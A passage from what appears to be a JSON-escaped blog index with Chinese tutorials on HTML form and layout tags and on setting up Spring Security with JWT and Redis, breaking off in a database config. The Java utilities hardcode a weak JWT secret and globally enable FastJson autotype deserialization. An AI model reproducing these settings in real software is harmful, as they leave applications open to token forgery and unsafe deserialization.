&lt;/form&gt; 分组控件 需求: 期望表单进行分类，比如个人信息中分为 基本信息 保密信息 在表单中可以用 &lt;fieldset&gt;&lt;/fieldset&gt; 进行定义一个带有边框和标题的分组表单控件 fieldset 字段集 –&gt; 表单控件分组 fieldset 中添加 legend 标签定义分组标签标题 可以直接在 body 体中定义 &lt;body&gt; &lt;fieldset&gt; &lt;legend&gt;基本信息&lt;/legend&gt; 姓名:&lt;input type=\"text\" name=\"\"&gt; &lt;/fieldset&gt; &lt;br&gt; &lt;fieldset&gt; &lt;legend&gt;保密信息&lt;/legend&gt; 电话:&lt;input&gt; &lt;/fieldset&gt; &lt;/body&gt; 按钮简介 按钮的分类: 提交按钮 重置按钮 普通按钮 图形按钮 双标签 button 按钮 提交按钮：具有点击确认提交信息同时发送表单数据给后台的功能 可通过 value 属性控制按钮显示的文本,例如一个登录按钮 &lt;input type=\"submit\" value=\"登录\"&gt; &lt;body&gt; &lt;form action=\"www.baidu.com\" target=\"view_window\"&gt; 用户名: &lt;input name=\"username\" type=\"text\"&gt; &lt;br&gt; 密码: &lt;input name=\"password\" type=\"password\"&gt; &lt;br&gt;&lt;br&gt; &lt;input type=\"submit\" value=\"登录\"&gt; &lt;input type=\"reset\" value=\"重置\"&gt; &lt;input type=\"button\" value=\"普通按钮\"&gt; &lt;br&gt; &lt;br&gt; &lt;br&gt; &lt;input type=\"image\" src=\"./img.png\" width=\"300\" height=\"150\"&gt; &lt;br&gt; &lt;button&gt;button提交按钮&lt;/button&gt; &lt;button type=\"button\"&gt;button普通按钮&lt;/button&gt; &lt;/form&gt; &lt;/body&gt; submit 定义语法: &lt;input type=\"submit\"&gt; 观察变化: 当我们点击提交按钮后 ①页面刷新了 ②输入框的内容消失了 ③浏览器地址栏里多了一个问号 form 标签中的 action 属性定义请求的接口地址 target 属性用于在当前窗口还是新窗口打开(不定义 target 属性默认是在当前页面打开) &lt;body&gt; &lt;form action=\"www.baidu.com\" target=\"view_window\"&gt; 用户名: &lt;input name=\"username\" type=\"text\"&gt; &lt;br&gt; 密码: &lt;input name=\"password\" type=\"password\"&gt; &lt;br&gt; &lt;input type=\"submit\" value=\"登录\"&gt; &lt;/form&gt; &lt;/body&gt; reset 重置按钮 重置 复位 擦除当前表单中的内容 定义语法 &lt;input type=\"reset\" value=\"重置\"&gt; button button 是一个普通按钮，不带有任何功能，一般需要绑定事件结合使用 定义语法 &lt;input type=\"button\" value=\"普通按钮\"&gt; button标签 和上面的 button，有所区别,上面是一个input输入框定义了 type 属性为 button 并且没有提交功能 button 标签 是单独的一个标签与 input 无关 定义语法: &lt;button&gt;button提交&lt;/button&gt; 和在 form表单中定义的 button标签默认和 sublime 按钮的功能是一致的,可以提交表单内容 如果想让 button 中的按钮只是一个普通按钮 需要定义属性 type=”button” image 图片按钮和 sublime 按钮的功能是一致的 展示上看起来就是用图片替换了按钮 定义语法: &lt;input type=\"image\" src=\"./img.png\" width=\"300\" height=\"150\"&gt; 综合案例&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;example&lt;/title&gt; &lt;style&gt; body { font-family: \"PingFang SC\" } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 align=\"center\"&gt;社区疫情流调信息表&lt;/h1&gt; &lt;p&gt; &amp;emsp;&amp;emsp;请大家做好个人防护，如去过风险地区，请及时项社区和公司报备;如您的身体壮壮异常（出现新冠病毒典型症状，如发热，咳嗽等）请及时上报异常情况，并按照通知，前往指定医院进行核酸检测，在去的路上请戴好口罩，做好个人防护，等待检测结果，期间请勿前去人多汇集的地方&lt;/p&gt; &lt;form action=\"\"&gt; &lt;fieldset&gt; &lt;legend&gt;基本信息&lt;/legend&gt; &lt;h4&gt;1.您的姓名&lt;/h4&gt; &lt;input type=\"text\"&gt; &lt;h4&gt;2.您的手机号&lt;/h4&gt; &lt;input type=\"text\" value=\"137****2473\" readonly&gt; &lt;h4&gt;3.您的性别&lt;/h4&gt; &lt;input type=\"radio\" name=\"Gander\" id=\"man\"&gt;&lt;label for=\"man\"&gt;男&lt;/label&gt; &lt;input type=\"radio\" name=\"Gander\" id=\"woman\"&gt;&lt;label for=\"woman\"&gt;女&lt;/label&gt; &lt;input type=\"radio\" name=\"Gander\" disabled&gt;保密 &lt;h4&gt;4.家庭地址&lt;/h4&gt; &lt;select&gt; &lt;option&gt;===所属省/直辖市===&lt;/option&gt; &lt;/select&gt; &lt;select&gt; &lt;option&gt;===市/区===&lt;/option&gt; &lt;/select&gt; &lt;select&gt; &lt;option&gt;===县===&lt;/option&gt; &lt;/select&gt; &lt;br&gt;&lt;br&gt; &lt;textarea name=\"\" id=\"\" cols=\"50\" rows=\"3\"&gt;请输入详情地址&lt;/textarea&gt; &lt;h4&gt;5.您现在的身体状况&lt;/h4&gt; &lt;input type=\"checkbox\"&gt;健康 &lt;br&gt; &lt;input type=\"checkbox\"&gt;发热 &lt;br&gt; &lt;input type=\"checkbox\"&gt;干咳 &lt;br&gt; &lt;input type=\"checkbox\"&gt;乏力 &lt;br&gt; &lt;input type=\"checkbox\"&gt;呼吸困难 &lt;br&gt; &lt;input type=\"checkbox\"&gt;咽痛 &lt;br&gt; &lt;input type=\"checkbox\"&gt;胸痛 &lt;br&gt; &lt;input type=\"checkbox\"&gt;肌肉酸痛/关节痛 &lt;br&gt; &lt;input type=\"checkbox\"&gt;呕吐 &lt;br&gt; &lt;input type=\"checkbox\"&gt;腹泻 &lt;br&gt; &lt;input type=\"checkbox\"&gt;味觉异常 &lt;br&gt; &lt;input type=\"checkbox\"&gt;嗅觉异常 &lt;br&gt; &lt;h4&gt;6.您的健康码颜色目前是&lt;/h4&gt; &lt;input type=\"radio\" name=\"codeColor\" id=\"green\"&gt;&lt;label for=\"green\"&gt;绿色&lt;/label&gt; &lt;input type=\"radio\" name=\"codeColor\" id=\"yellow\"&gt;&lt;label for=\"yellow\"&gt;黄色&lt;/label&gt; &lt;input type=\"radio\" name=\"codeColor\" id=\"red\"&gt;&lt;label for=\"red\"&gt;红色&lt;/label&gt; &lt;h4&gt;7.您是否在 14 天内有过中高风险地区旅居史，或与确诊人员有过较为密切的接触&lt;/h4&gt; &lt;input type=\"radio\" name=\"dangerous\" id=\"yes\"&gt;&lt;label for=\"yes\"&gt;是&lt;/label&gt; &lt;input type=\"radio\" name=\"dangerous\" id=\"no\"&gt;&lt;label for=\"no\"&gt;否&lt;/label&gt; &lt;h4&gt;8.疫苗接种情况&lt;/h4&gt; &lt;input type=\"radio\" name=\"immunity\" id=\"first\"&gt;&lt;label for=\"first\"&gt;已接种第一针&lt;/label&gt; &lt;input type=\"radio\" name=\"immunity\" id=\"second\"&gt;&lt;label for=\"second\"&gt;已接种第二针&lt;/label&gt; &lt;input type=\"radio\" name=\"immunity\" id=\"third\"&gt;&lt;label for=\"third\"&gt;三针完成天下无敌&lt;/label&gt; &lt;/fieldset&gt; &lt;fieldset&gt; &lt;legend&gt;保密信息&lt;/legend&gt; &lt;h4&gt;1.身份证信息&lt;/h4&gt; &lt;span&gt;正面:&lt;/span&gt; &lt;input type=\"file\"&gt;&lt;br&gt; &lt;span&gt;反面:&lt;/span&gt; &lt;input type=\"file\"&gt; &lt;h4&gt;2.学历信息(最高)&lt;/h4&gt; &lt;select name=\"选择学历\" id=\"\"&gt; &lt;option value=\"\"&gt;硕士及以上&lt;/option&gt; &lt;option value=\"\"&gt;本科&lt;/option&gt; &lt;option value=\"\"&gt;大专&lt;/option&gt; &lt;option value=\"\"&gt;高中及一下&lt;/option&gt; &lt;/select&gt; &lt;h4&gt;3.是否服兵役&lt;/h4&gt; &lt;input type=\"radio\" name=\"soldier\" id=\"join\"&gt;&lt;label for=\"join\"&gt;是&lt;/label&gt; &lt;input type=\"radio\" name=\"soldier\" id=\"notJoin\"&gt;&lt;label for=\"notJoin\"&gt;否&lt;/label&gt; &lt;h4&gt;4.个人意见&lt;/h4&gt; &lt;textarea name=\"\" id=\"\" cols=\"50\" rows=\"5\"&gt;征集个人意见&lt;/textarea&gt; &lt;/fieldset&gt; &lt;button&gt;上报社区&lt;/button&gt; &lt;input type=\"reset\" value=\"重置\"&gt; &lt;input type=\"image\" src=\"./img.png\" width=\"89\" height=\"50\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 实用性标签hr hr 标签是 horizontal rule 的简写,表示水平线,作用是在网页画一条水平分割线,可以在视觉上将文档分割成多个部分 width height 设置宽高 默认宽度横跨整个屏幕,默认高度 2px noshade 用来去掉水平线阴影 color 用于定义水平线的颜色 align 用来调整水平线水平对齐方式(前提是要有宽度,默认是水平居中) 示例 &lt;hr color=\"green\" align=\"left\"&gt; 单标签 pre pre preformatted 预格式化的文本 pre 标签中的文本以固定宽度的字体显示,并且文本保留了空格和换行,文本将完全按照 HTML 中的源码进行显示 &lt;pre&gt; 床前明月光， 疑是地上霜。 举头望明月， 低头思故乡。 &lt;/pre&gt; Map Map 标签用来定义图像映射(也就是给一个图片定义一个或多个热点区域,点击不同的区域实现链接的跳转) Map 是一个双标签,有一个必须定义的属性 name Map 的 name 属性要和 img 标签的 usemap 属性相关联 （就是把某一张图片当成热点地图，创建对应的关联关系） Map 下通过子标签 area 定义热点区域的大小 位置 形状 area的属性: herf 用来定义热点区域链接的目标地址,互联网和本地的网页图片地址都可以 shape 用来定义区域的形状 default 所有区域 rect 矩形 circle 圆形 poly 多边形 coords 用来定义可点击区域的坐标,需要与 shape 属性配合使用 &lt;img src=\"./img.png\" alt=\"\" usemap=\"#celestial\"&gt; &lt;map name=\"celestial\"&gt; &lt;!-- shape=\"circle\" 圆心坐标(472,100) 半径 R=50 --&gt; &lt;area shape=\"circle\" coords=\"472,100,50\" href=\"www.baidu.com\" alt=\"\"&gt; &lt;!-- shape=\"rect\" 矩形左上角顶点 A(90,40) 矩形右下角顶点 C(137,90) --&gt; &lt;area shape=\"rect\" coords=\"90,40,137,90\" href=\"www.adalucky.com\" alt=\"\"&gt; &lt;!-- shape=\"poly\" 多边形 A(x1,y1 x2,y2 x3,y3 x4,y4 x5,y5)--&gt; &lt;area shape=\"poly\" coords=\"263,123,399,199,263,465\" href=\"www.google.com\" alt=\"\"&gt; &lt;/map&gt; 示例&lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Title&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;b&gt;锄禾日当午&lt;/b&gt; &lt;hr color=\"green\" align=\"left\"&gt; &lt;b&gt;汗滴禾下土&lt;/b&gt; &lt;b&gt;低头思故乡&lt;/b&gt; &lt;br&gt; &lt;br&gt; &lt;pre&gt; 床前明月光， 疑是地上霜。 举头望明月， 低头思故乡。 &lt;/pre&gt; &lt;/div&gt; &lt;img src=\"./img.png\" alt=\"\" usemap=\"#celestial\"&gt; &lt;map name=\"celestial\"&gt; &lt;!-- shape=\"circle\" 圆心坐标(472,100) 半径 R=50 --&gt; &lt;area shape=\"circle\" coords=\"472,100,50\" href=\"www.baidu.com\" alt=\"\"&gt; &lt;!-- shape=\"rect\" 矩形左上角顶点 A(90,40) 矩形右下角顶点 C(137,90) --&gt; &lt;area shape=\"rect\" coords=\"90,40,137,90\" href=\"www.adalucky.com\" alt=\"\"&gt; &lt;!-- shape=\"poly\" 多边形 A(x1,y1 x2,y2 x3,y3 x4,y4 x5,y5)--&gt; &lt;area shape=\"poly\" coords=\"263,123,399,199,263,465\" href=\"www.google.com\" alt=\"\"&gt; &lt;/map&gt; &lt;/body&gt; &lt;/html&gt; iframe iframe 的作用：用来在一个网页中显示另外一个网页 iframe 是一个双标签 基本语法 &lt;iframe&gt;&lt;/iframe&gt; 常用属性 src 页面路径 width height 宽高 frameborder 框架边框 一般设置为 0 scrolling 滚动条,取值范围【auto(在需要情况下显示滚动条，auto 也是默认值)、yes(始终显示)、no(从不显示)】 iframe 也可以作为一个链接的目标框架(iframe 的 name 属性值和 a 标签的 target 属性值要一致) &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;iframe example&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe src=\"https://www.bilibili.com\" frameborder=\"0\" width=\"500\" height=\"350\"&gt;&lt;/iframe&gt; &lt;div&gt; &lt;a href=\"http://qfedu.com\" target=\"iframeExample\"&gt;&lt;b&gt;千峰&lt;/b&gt;&lt;/a&gt; &lt;a href=\"https://www.bilibili.com\" target=\"iframeExample\"&gt;&lt;b&gt;哔哩哔哩&lt;/b&gt;&lt;/a&gt; &lt;a href=\"https://www.bilibili.com/video/BV1mm4y1X7Hc?p=15\" target=\"iframeExample\"&gt;&lt;b&gt;Spring Security&lt;/b&gt;&lt;/a&gt; &lt;/div&gt; &lt;iframe src=\"https://www.bilibili.com\" frameborder=\"0\" width=\"500\" height=\"350\" name=\"iframeExample\"&gt;&lt;/iframe&gt; &lt;/body&gt; &lt;/html&gt; 页面布局常用标签 p 标签是段落标签用于一段文本的描述，该标签是块状元素，如果想要对段落中的某些文本加粗可以用 &lt;strong&gt;&lt;/strong&gt; 包裹起来，如果要用斜体可以用 &lt;em&gt;&lt;/em&gt; 包裹起来 &lt;div&gt;&lt;/div&gt; 无意义块状元素标签 &lt;span&gt;&lt;/span&gt;无意义行内元素标签 &lt;p&gt;&lt;/p&gt;段落标签 &lt;ul&gt;&lt;/ul&gt;无序列表 &lt;li&gt;&lt;/li&gt;列表项 &lt;a&gt;&lt;/a&gt;超链接标签 &lt;img/&gt;图片标签 &lt;i&gt;&lt;/i&gt;斜体标签 &lt;b&gt;&lt;/b&gt;粗体标签","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"html","slug":"html","permalink":"https://www.adalucky.com/tags/html/"}],"author":"Ada"},{"title":"Spring Security 5.X","slug":"Auto/SpringSecurity","date":"2022-04-20T13:42:15.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/springsecurity/","link":"","permalink":"https://www.adalucky.com/auto/springsecurity/","excerpt":"Spring Security是一个功能强大且可高度自定义的身份验证和访问控制框架。它是保护基于Spring的应用程序的事实上的标准。 Spring Security是一个专注于为Java应用程序提供身份验证和授权的框架。与所有Spring项目一样，Spring Security的真正强大之处在于它可以轻松扩展以满足自定义要求。","text":"Spring Security是一个功能强大且可高度自定义的身份验证和访问控制框架。它是保护基于Spring的应用程序的事实上的标准。 Spring Security是一个专注于为Java应用程序提供身份验证和授权的框架。与所有Spring项目一样，Spring Security的真正强大之处在于它可以轻松扩展以满足自定义要求。 参考资料 简介需求 实现前后端分离，按钮级权限控制（接口权限控制） 围绕 RBAC 权限模型进行设计 环境说明 IDEA 2022.1 JDK 17.0.2 Gradle 7.4.1 SpringBoot 2.6.4 Spring Security 5.6.2 简介 Spring Security 是一个功能强大且可高度自定义的身份验证和访问控制框架。它是保护基于Spring的应用程序的事实上的标准。 Spring Security 是一个专注于为Java应用程序提供身份验证和授权的框架。与所有Spring项目一样，Spring Security的真正强大之处在于它可以轻松扩展以满足自定义要求。 一般来说中大型的项目都是使用SpringSecurity 来做安全框架。小项目有Shiro的比较多，因为相比与SpringSecurity，Shiro的上手更加的简单。 一般Web应用的需要进行认证和授权。 认证：验证当前访问系统的是不是本系统的用户，并且要确认具体是哪个用户 授权：经过认证后判断当前用户是否有权限进行某个操作 而认证和授权也是SpringSecurity作为安全架的核心功能。 对比 Shiro Spring Security 是 Spring 家族中的一个安全管理框架。相比与另外一个安全框架Shiro，它提供了更丰富的功能，社区资源也比Shiro丰富。 Spring 以简单而闻名，但讽刺的是很多人发现安装Spring Security很难 Spring Security有更好的社区支持 Apache Shiro 在 Spring Security 处理密码学方面有一个额外的模块 Spring Security 对 Spring 结合较好，如果项目用的 SpringMVC，使用起来很方便。但是如果项目中没有用到Spring，那就不要考虑它了。 快速入门 在 SpringBoot 工程快速整合 Security 在 SpringBoot 项目中使用 SpringSecurity 我们只需要引入启动器的依赖后重启项目 访问 http://localhost:port/login 进行登录 用户名默认为：user 密码在启动的控制台有打印 可以自行实现一下，访问一个接口，如果没有登录会自动重定向到 login 页面，也就是说没有登录就无法访问接口 implementation(\"org.springframework.boot:spring-boot-starter-security\") 认证登陆校验流程 原理初探 想要知道如何实现自己的登陆流程就必须要先知道入门案例中 Spring Security的流程。 SpringSecurity完整流程 Spring Security 的原理其实就是一个过滤器链，内部包含了提供各种功能的过滤器。这里我们可以看看入门案例中的过滤器。 过滤器链: 多个过滤器组成一个过滤器链 图中只展示了快速入门中的核心过滤器，其它的非核心过滤器并没有在图中展示。 UsernamePasswordAuthenticationFilter:负责处理我们在登陆页面填写了用户名密码后的登陆请求。入门案例的认证工作主要有它负责。 ExceptionTranslationFilter：处理过滤器链中抛出的任何AccessDeniedException和AuthenticationException,也就是说在处理中捕获到了异常都可以可以用它处理 FilterSecurityInterceptor：负责权限校验的过滤器。 完整的过滤器 通过Debug查看当前系统中 Spring Security 过滤器链中有哪些过滤器及它们的顺序 run.getBean(DefaultSecurityFilterChain.class) 思路分析登录认证流程详解 概念速查: Authentication接口: 它的实现类，表示当前访问系统的用户，封装了用户相关信息。 AuthenticationManager接口：定义了认证Authentication的方法 UserDetailsService接口：加载用户特定数据的核心接口。里面定义了一个根据用户名查询用户信息的方法。 UserDetails接口：提供核心用户信息。通过UserDetailsService根据用户名获取处理的用户信息要封装成UserDetails对象返回。然后将这些信息封装到Authentication对象中。 登录改造思路 上面的流程对我们前后端分离的项目有两个地方需要改造： ① 5.1 步骤 我们需要去数据库中查询而不是在内存中查询，因此我们要实现接口重新一个实现类 ② 步骤 1 步骤 10 我们应该让前端来掉我们自己的 controller 然后我们去掉对应的认证，最后这个 controller 返回的时候需要封装一个 token 回去 UsernamePasswordAuthenticationFilter 换成我们自己的登录接口 InMemoryUserDetailManager 换成我们自己实现了 UserDetailsService 接口的实现了去数据查询用户 认证思路 上面只是改造了登录，登录后，请求接口时我们怎么去判断是否已经登录呢？是当前用户是谁呢？ 其实我们在上面返回的 jwt 生成的 token 用了用户 id 去生成 所以解析一下 token 就知道是谁了 用户详情获取 登录 –&gt; 返回 token –&gt; JWT 认证 –&gt; 如何获取用户的详情？比如权限？ 简单粗暴：登录后每次都带有 token，token 一解析就知道用户 ID,然后根据用户 ID 去数据库查询对应的权限（这种方式就是每次请求都需要去查询用户的权限，对数据库来说并不友好） 现实实践：如果能在我们每次登录成功以后就把我们的用户信息写到缓存里面就好了,缓存的 key 就是用户 ID, value 就是用户详情 会不会刚好有那么一个东西叫做 Redis 总结 登录 ①自定义登录接口 调用ProviderManager的方法进行认证 如果认证通过生成jwt 把用户信息存入redis中 ②自定义UserDetailsService 在这个实现类中去查询数据库 校验 ①定义Jwt认证过滤器 获取token 解析token获取其中的userid 从redis中获取用户信息 存入SecurityContextHolder 准备工作依赖准备 再次集成完整的环境 Redis fastjson jwt implementation(\"org.springframework.boot:spring-boot-starter-data-redis\") implementation(\"com.alibaba:fastjson:1.2.80\") implementation(\"io.jsonwebtoken:jjwt:0.9.1\") 配置类 创建 Redis 配置类 点击显/隐代码块(Redis配置类) package com.adalucky.config; import com.adalucky.utils.redis.FastJsonRedisSerializer; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.data.redis.connection.RedisConnectionFactory; import org.springframework.data.redis.core.RedisTemplate; import org.springframework.data.redis.serializer.StringRedisSerializer; /** * @author ada * @Version JDK17 * @Description Redis 配置类 * @since 2022/4/22 00:34 */ @Configuration public class RedisConfig { @Bean @SuppressWarnings(value = {\"unchecked\", \"rawtypes\"}) public RedisTemplate&lt;Object, Object&gt; redisTemplate(RedisConnectionFactory connectionFactory) { RedisTemplate&lt;Object, Object&gt; template = new RedisTemplate&lt;&gt;(); template.setConnectionFactory(connectionFactory); FastJsonRedisSerializer serializer = new FastJsonRedisSerializer(Object.class); // 使用StringRedisSerializer来序列化和反序列化redis的key值 template.setKeySerializer(new StringRedisSerializer()); template.setValueSerializer(serializer); // Hash的key也采用StringRedisSerializer的序列化方式 template.setHashKeySerializer(new StringRedisSerializer()); template.setHashValueSerializer(serializer); template.afterPropertiesSet(); return template; } } 工具类 创建一些工具类 JWT工具类 FastJson序列化Redis RedisTemplate工具类 respons工具类 点击显/隐代码块(JWT工具类) package com.adalucky.utils.jwt; import io.jsonwebtoken.Claims; import io.jsonwebtoken.JwtBuilder; import io.jsonwebtoken.Jwts; import io.jsonwebtoken.SignatureAlgorithm; import javax.crypto.SecretKey; import javax.crypto.spec.SecretKeySpec; import java.util.Base64; import java.util.Date; import java.util.UUID; /** * @author ada * @Version JDK17 * @Description JWT工具类 * @since 2022/4/22 00:44 */ public class JwtUtil { //有效期为 public static final Long JWT_TTL = 60 * 60 * 1000L;// 60 * 60 *1000 一个小时 //设置秘钥明文 public static final String JWT_KEY = \"sangeng\"; public static String getUUID() { String token = UUID.randomUUID().toString().replaceAll(\"-\", \"\"); return token; } /** * 生成jtw * * @param subject token中要存放的数据（json格式） * @return */ public static String createJWT(String subject) { JwtBuilder builder = getJwtBuilder(subject, null, getUUID());// 设置过期时间 return builder.compact(); } /** * 生成jtw * * @param subject token中要存放的数据（json格式） * @param ttlMillis token超时时间 * @return */ public static String createJWT(String subject, Long ttlMillis) { JwtBuilder builder = getJwtBuilder(subject, ttlMillis, getUUID());// 设置过期时间 return builder.compact(); } private static JwtBuilder getJwtBuilder(String subject, Long ttlMillis, String uuid) { SignatureAlgorithm signatureAlgorithm = SignatureAlgorithm.HS256; SecretKey secretKey = generalKey(); long nowMillis = System.currentTimeMillis(); Date now = new Date(nowMillis); if (ttlMillis == null) { ttlMillis = JwtUtil.JWT_TTL; } long expMillis = nowMillis + ttlMillis; Date expDate = new Date(expMillis); return Jwts.builder() .setId(uuid) //唯一的ID .setSubject(subject) // 主题 可以是JSON数据 .setIssuer(\"sg\") // 签发者 .setIssuedAt(now) // 签发时间 .signWith(signatureAlgorithm, secretKey) //使用HS256对称加密算法签名, 第二个参数为秘钥 .setExpiration(expDate); } /** * 创建token * * @param id * @param subject * @param ttlMillis * @return */ public static String createJWT(String id, String subject, Long ttlMillis) { JwtBuilder builder = getJwtBuilder(subject, ttlMillis, id);// 设置过期时间 return builder.compact(); } public static void main(String[] args) throws Exception { String token = \"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJjYWM2ZDVhZi1mNjVlLTQ0MDAtYjcxMi0zYWEwOGIyOTIwYjQiLCJzdWIiOiJzZyIsImlzcyI6InNnIiwiaWF0IjoxNjM4MTA2NzEyLCJleHAiOjE2MzgxMTAzMTJ9.JVsSbkP94wuczb4QryQbAke3ysBDIL5ou8fWsbt_ebg\"; Claims claims = parseJWT(token); System.out.println(claims); } /** * 生成加密后的秘钥 secretKey * * @return */ public static SecretKey generalKey() { byte[] encodedKey = Base64.getDecoder().decode(JwtUtil.JWT_KEY); SecretKey key = new SecretKeySpec(encodedKey, 0, encodedKey.length, \"AES\"); return key; } /** * 解析 * * @param jwt * @return * @throws Exception */ public static Claims parseJWT(String jwt) throws Exception { SecretKey secretKey = generalKey(); return Jwts.parser() .setSigningKey(secretKey) .parseClaimsJws(jwt) .getBody(); } } 点击显/隐代码块(FastJson序列化Redis) package com.adalucky.utils.redis; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.ParserConfig; import com.alibaba.fastjson.serializer.SerializerFeature; import com.fasterxml.jackson.databind.JavaType; import com.fasterxml.jackson.databind.type.TypeFactory; import org.springframework.data.redis.serializer.RedisSerializer; import org.springframework.data.redis.serializer.SerializationException; import java.nio.charset.Charset; /** * @author ada * @Version JDK17 * @Description FastJson序列化Redis https://blog.51cto.com/binghe001/5211167 * @since 2022/4/22 00:21 */ public class FastJsonRedisSerializer&lt;T&gt; implements RedisSerializer&lt;T&gt; { public static final Charset DEFAULT_CHARSET = Charset.forName(\"UTF-8\"); private Class&lt;T&gt; clazz; static { ParserConfig.getGlobalInstance().setAutoTypeSupport(true); } public FastJsonRedisSerializer(Class&lt;T&gt; clazz) { super(); this.clazz = clazz; } @Override public byte[] serialize(T t) throws SerializationException { if (t == null) { return new byte[0]; } return JSON.toJSONString(t, SerializerFeature.WriteClassName).getBytes(DEFAULT_CHARSET); } @Override public T deserialize(byte[] bytes) throws SerializationException { if (bytes == null || bytes.length &lt;= 0) { return null; } String str = new String(bytes, DEFAULT_CHARSET); return JSON.parseObject(str, clazz); } protected JavaType getJavaType(Class&lt;?&gt; clazz) { return TypeFactory.defaultInstance().constructType(clazz); } } 点击显/隐代码块(RedisTemplate工具类) package com.adalucky.utils.redis; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.data.redis.core.BoundSetOperations; import org.springframework.data.redis.core.HashOperations; import org.springframework.data.redis.core.RedisTemplate; import org.springframework.data.redis.core.ValueOperations; import org.springframework.stereotype.Component; import java.util.*; import java.util.concurrent.TimeUnit; /** * @author ada * @Version JDK17 * @Description RedisTemplate工具类，通过 @Autowired 注入 RedisCache 即可完成调用 * @since 2022/4/22 00:46 */ @SuppressWarnings(value = {\"unchecked\", \"rawtypes\"}) @Component public class RedisCache { @Autowired public RedisTemplate redisTemplate; /** * 缓存基本的对象，Integer、String、实体类等 * * @param key 缓存的键值 * @param value 缓存的值 */ public &lt;T&gt; void setCacheObject(final String key, final T value) { redisTemplate.opsForValue().set(key, value); } /** * 缓存基本的对象，Integer、String、实体类等 * * @param key 缓存的键值 * @param value 缓存的值 * @param timeout 时间 * @param timeUnit 时间颗粒度 */ public &lt;T&gt; void setCacheObject(final String key, final T value, final Integer timeout, final TimeUnit timeUnit) { redisTemplate.opsForValue().set(key, value, timeout, timeUnit); } /** * 设置有效时间 * * @param key Redis键 * @param timeout 超时时间 * @return true=设置成功；false=设置失败 */ public boolean expire(final String key, final long timeout) { return expire(key, timeout, TimeUnit.SECONDS); } /** * 设置有效时间 * * @param key Redis键 * @param timeout 超时时间 * @param unit 时间单位 * @return true=设置成功；false=设置失败 */ public boolean expire(final String key, final long timeout, final TimeUnit unit) { return redisTemplate.expire(key, timeout, unit); } /** * 获得缓存的基本对象。 * * @param key 缓存键值 * @return 缓存键值对应的数据 */ public &lt;T&gt; T getCacheObject(final String key) { ValueOperations&lt;String, T&gt; operation = redisTemplate.opsForValue(); return operation.get(key); } /** * 删除单个对象 * * @param key */ public boolean deleteObject(final String key) { return redisTemplate.delete(key); } /** * 删除集合对象 * * @param collection 多个对象 * @return */ public long deleteObject(final Collection collection) { return redisTemplate.delete(collection); } /** * 缓存List数据 * * @param key 缓存的键值 * @param dataList 待缓存的List数据 * @return 缓存的对象 */ public &lt;T&gt; long setCacheList(final String key, final List&lt;T&gt; dataList) { Long count = redisTemplate.opsForList().rightPushAll(key, dataList); return count == null ? 0 : count; } /** * 获得缓存的list对象 * * @param key 缓存的键值 * @return 缓存键值对应的数据 */ public &lt;T&gt; List&lt;T&gt; getCacheList(final String key) { return redisTemplate.opsForList().range(key, 0, -1); } /** * 缓存Set * * @param key 缓存键值 * @param dataSet 缓存的数据 * @return 缓存数据的对象 */ public &lt;T&gt; BoundSetOperations&lt;String, T&gt; setCacheSet(final String key, final Set&lt;T&gt; dataSet) { BoundSetOperations&lt;String, T&gt; setOperation = redisTemplate.boundSetOps(key); Iterator&lt;T&gt; it = dataSet.iterator(); while (it.hasNext()) { setOperation.add(it.next()); } return setOperation; } /** * 获得缓存的set * * @param key * @return */ public &lt;T&gt; Set&lt;T&gt; getCacheSet(final String key) { return redisTemplate.opsForSet().members(key); } /** * 缓存Map * * @param key * @param dataMap */ public &lt;T&gt; void setCacheMap(final String key, final Map&lt;String, T&gt; dataMap) { if (dataMap != null) { redisTemplate.opsForHash().putAll(key, dataMap); } } /** * 获得缓存的Map * * @param key * @return */ public &lt;T&gt; Map&lt;String, T&gt; getCacheMap(final String key) { return redisTemplate.opsForHash().entries(key); } /** * 往Hash中存入数据 * * @param key Redis键 * @param hKey Hash键 * @param value 值 */ public &lt;T&gt; void setCacheMapValue(final String key, final String hKey, final T value) { redisTemplate.opsForHash().put(key, hKey, value); } /** * 获取Hash中的数据 * * @param key Redis键 * @param hKey Hash键 * @return Hash中的对象 */ public &lt;T&gt; T getCacheMapValue(final String key, final String hKey) { HashOperations&lt;String, String, T&gt; opsForHash = redisTemplate.opsForHash(); return opsForHash.get(key, hKey); } /** * 删除Hash中的数据 * * @param key * @param hkey */ public void delCacheMapValue(final String key, final String hkey) { HashOperations hashOperations = redisTemplate.opsForHash(); hashOperations.delete(key, hkey); } /** * 获取多个Hash中的数据 * * @param key Redis键 * @param hKeys Hash键集合 * @return Hash对象集合 */ public &lt;T&gt; List&lt;T&gt; getMultiCacheMapValue(final String key, final Collection&lt;Object&gt; hKeys) { return redisTemplate.opsForHash().multiGet(key, hKeys); } /** * 获得缓存的基本对象列表 * * @param pattern 字符串前缀 * @return 对象列表 */ public Collection&lt;String&gt; keys(final String pattern) { return redisTemplate.keys(pattern); } } 点击显/隐代码块(respons package com.adalucky.utils.web; import javax.servlet.http.HttpServletResponse; import java.io.IOException; /** * @author ada * @Version JDK17 * @Description respons 工具类 往响应中快速写内容 * @since 2022/4/22 00:52 */ public class WebUtils { /** * 将字符串渲染到客户端 * * @param response 渲染对象 * @param string 待渲染的字符串 * @return null */ public static String renderString(HttpServletResponse response, String string) { try { response.setStatus(200); response.setContentType(\"application/json\"); response.setCharacterEncoding(\"utf-8\"); response.getWriter().print(string); } catch (IOException e) { e.printStackTrace(); } return null; } } 数据库配置# spring 相关集成配置 spring: # 数据源配置 datasource: driver-class-name: com.p6spy.engine.spy.P6SpyDriver 